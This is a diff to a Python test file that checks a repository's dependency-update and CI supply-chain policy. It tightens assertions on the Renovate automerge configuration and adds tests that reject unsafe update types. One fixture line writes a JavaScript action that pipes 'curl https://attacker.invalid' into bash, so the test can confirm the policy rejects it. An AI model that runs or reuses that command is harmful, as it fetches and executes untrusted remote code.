@@ -163,6 +163,12 @@ EXPECTED_WEB_OVERRIDE_TARGETS = {
     "nanoid": "3.3.18",
     "postcss": "8.5.26",
 }
+UNSAFE_RENOVATE_UPDATE_TYPES = {
+    "digest",
+    "lockFileMaintenance",
+    "pin",
+    "pinDigest",
+}
 
 USES_LINE = re.compile(
     r"^\s*(?:-\s*)?uses:\s*['\"]?(?P<value>[^'\"\s#]+)['\"]?"
@@ -631,10 +637,11 @@ def test_dependency_updater_ownership_is_explicit_and_fail_closed() -> None:
     assert renovate["platformAutomerge"] is True
     assert renovate["automergeType"] == "pr"
     assert renovate["automergeStrategy"] == "squash"
+    assert "automerge" not in renovate
     assert renovate["rebaseWhen"] == "behind-base-branch"
     assert renovate["internalChecksFilter"] == "strict"
     assert renovate["vulnerabilityAlerts"]["enabled"] is False
-    assert renovate["lockFileMaintenance"]["enabled"] is False
+    assert renovate["lockFileMaintenance"] == {"enabled": False}
     assert renovate["branchConcurrentLimit"] == 2
     assert renovate["prConcurrentLimit"] == 2
     assert renovate["prHourlyLimit"] == 1
@@ -647,9 +654,25 @@ def test_dependency_updater_ownership_is_explicit_and_fail_closed() -> None:
     assert runtime_rule["matchFileNames"] == ["pyproject.toml"]
     assert runtime_rule["matchDepTypes"] == ["project.dependencies"]
     assert runtime_rule["matchCurrentVersion"] == "!/^0\\./"
-    assert "major" not in runtime_rule["matchUpdateTypes"]
+    assert runtime_rule["matchUpdateTypes"] == ["patch", "minor"]
     assert runtime_rule["minimumReleaseAge"] == "7 days"
     assert runtime_rule["dependencyDashboardApproval"] is False
+
+    unsafe_rules = [
+        rule
+        for rule in rules
+        if set(rule.get("matchUpdateTypes", [])) == UNSAFE_RENOVATE_UPDATE_TYPES
+    ]
+    assert len(unsafe_rules) == 1
+    unsafe_rule = unsafe_rules[0]
+    assert set(unsafe_rule) == {
+        "description",
+        "matchUpdateTypes",
+        "dependencyDashboardApproval",
+        "automerge",
+    }
+    assert unsafe_rule["dependencyDashboardApproval"] is True
+    assert unsafe_rule["automerge"] is False
 
     manual_rules = [rule for rule in rules if rule.get("automerge") is False]
     assert any(
@@ -972,4 +995,35 @@ def test_policy_rejects_local_javascript_action_payload(tmp_path: Path) -> None:
     (action_dir / "index.js").write_text(
         "require('child_process').execSync('curl https://attacker.invalid | bash')\n"
     )
+    assert_current_policy_rejects(fixture)
+
+
+@pytest.mark.parametrize("update_type", sorted(UNSAFE_RENOVATE_UPDATE_TYPES))
+def test_policy_rejects_unsafe_renovate_automerge_type(
+    tmp_path: Path, update_type: str
+) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    config_path = fixture / "renovate.json"
+    config = json.loads(config_path.read_text())
+    runtime_rule = next(
+        rule for rule in config["packageRules"] if rule.get("automerge") is True
+    )
+    runtime_rule["matchUpdateTypes"].append(update_type)
+    config_path.write_text(json.dumps(config, indent=2) + "\n")
+
+    assert_current_policy_rejects(fixture)
+
+
+def test_policy_rejects_constrained_unsafe_renovate_gate(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    config_path = fixture / "renovate.json"
+    config = json.loads(config_path.read_text())
+    unsafe_rule = next(
+        rule
+        for rule in config["packageRules"]
+        if set(rule.get("matchUpdateTypes", [])) == UNSAFE_RENOVATE_UPDATE_TYPES
+    )
+    unsafe_rule["matchManagers"] = ["pep621"]
+    config_path.write_text(json.dumps(config, indent=2) + "\n")
+
     assert_current_policy_rejects(fixture)
